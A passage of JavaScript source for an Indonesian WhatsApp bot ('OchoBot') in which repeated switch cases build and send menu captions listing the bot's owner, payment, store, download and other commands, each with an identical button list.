                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ownermenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨* ]
┃ ϟ .autopromosi
┃ ϟ .autoread
┃ ϟ .autoreadsw
┃ ϟ .autotyping
┃ ϟ .addowner
┃ ϟ .addownerall
┃ ϟ .listowner
┃ ϟ .delowner
┃ ϟ .delownerall
┃ ϟ .self/public
┃ ϟ .block
┃ ϟ .unblok
┃ ϟ .setbiobot
┃ ϟ .setnamabot
┃ ϟ .clearsession
┃ ϟ .restart
┃ ϟ .addcase
┃ ϟ .delcase
┃ ϟ .getcase
┃ ϟ .editcase
┃ ϟ .spekvps
┃ ϟ .uptime
┃ ϟ .totalfitur
┃ ϟ .autoblock
┃ ϟ .backup
┃ ϟ .gconly
┃ ϟ .clearchat
┃ ϟ .addkey
┃ ϟ .delkey
┃ ϟ .listkey
╰━━━━━━━━━━━━━━━━━━━━
  `

await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "paymentmenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗠𝗘𝗡𝗨* ]
┃ ϟ .dana
┃ ϟ .ovo
┃ ϟ .gopay
┃ ϟ .qris
╰━━━━━━━━━━━━━━━━━━━━
`

await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "storemenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
    });
    const time = currentDate.toLocaleTimeString("id-ID");
    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨* ]
┃ ϟ .addrespon
┃ ϟ .delrespon
┃ ϟ .listrespon
┃ ϟ .done
┃ ϟ .proses
┃ ϟ .jpm
┃ ϟ .jpm2
┃ ϟ .jpm3
┃ ϟ .jpmht
┃ ϟ .jpmtesti
┃ ϟ .jpmslide
┃ ϟ .jpmslideht
┃ ϟ .sendtesti
┃ ϟ .payment
┃ ϟ .pushkontak
┃ ϟ .cekidgrup
┃ ϟ .savekontak
┃ ϟ .setjedapush
╰━━━━━━━━━━━━━━━━━━━━
  `
await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "othermenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
    });
    const time = currentDate.toLocaleTimeString("id-ID");
    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨* ]
┃ ϟ .cekidch
┃ ϟ .cekidgc
┃ ϟ .reactch
┃ ϟ .rvo
┃ ϟ .qc
┃ ϟ .stiker
┃ ϟ .stikerwm
┃ ϟ .pinterest
┃ ϟ .buatgambar
┃ ϟ .emojimix
┃ ϟ .emojitogif
┃ ϟ .iqc
┃ ϟ .iqc2
┃ ϟ .hd
┃ ϟ .hd2
╰━━━━━━━━━━━━━━━━━━━━
  `
await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "newmenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
    });
    const time = currentDate.toLocaleTimeString("id-ID");
    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗡𝗘𝗪 𝗠𝗘𝗡𝗨* ]
┃ ϟ .createwebmenu
┃ ϟ .menuslide
┃ ϟ .upswgc
┃ ϟ .emojimix
┃ ϟ .emojitogif
┃ ϟ .iqc
┃ ϟ .iqc2
┃ ϟ .hd
┃ ϟ .hd2
┃ ϟ .createweb
┃ ϟ .createweb2
┃ ϟ .scweb
┃ ϟ .listweb
┃ ϟ .listweb2
┃ ϟ .delweb
┃ ϟ .addsellerweb
┃ ϟ .delsellerweb
┃ ϟ .listsellerweb
┃ ϟ .resetsellerweb
┃ ϟ .autojpmgb on/off/status
┃ ϟ .setjpmgb
┃ ϟ .delsetjpmgb
┃ ϟ .addkey
┃ ϟ .delkey
┃ ϟ .listkey
╰━━━━━━━━━━━━━━━━━━━━
  `
await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "downloadmenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
    const time = currentDate.toLocaleTimeString("id-ID");
    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨* ]
┃ ϟ .tiktok
┃ ϟ .tiktokmp3
┃ ϟ .facebook
┃ ϟ .capcut
┃ ϟ .instagram
┃ ϟ .ytmp3
┃ ϟ .ytmp4
┃ ϟ .play
┃ ϟ .playvid
┃ ϟ .mediafire
╰━━━━━━━━━━━━━━━━━━━━
  `;
await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "toolsmenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
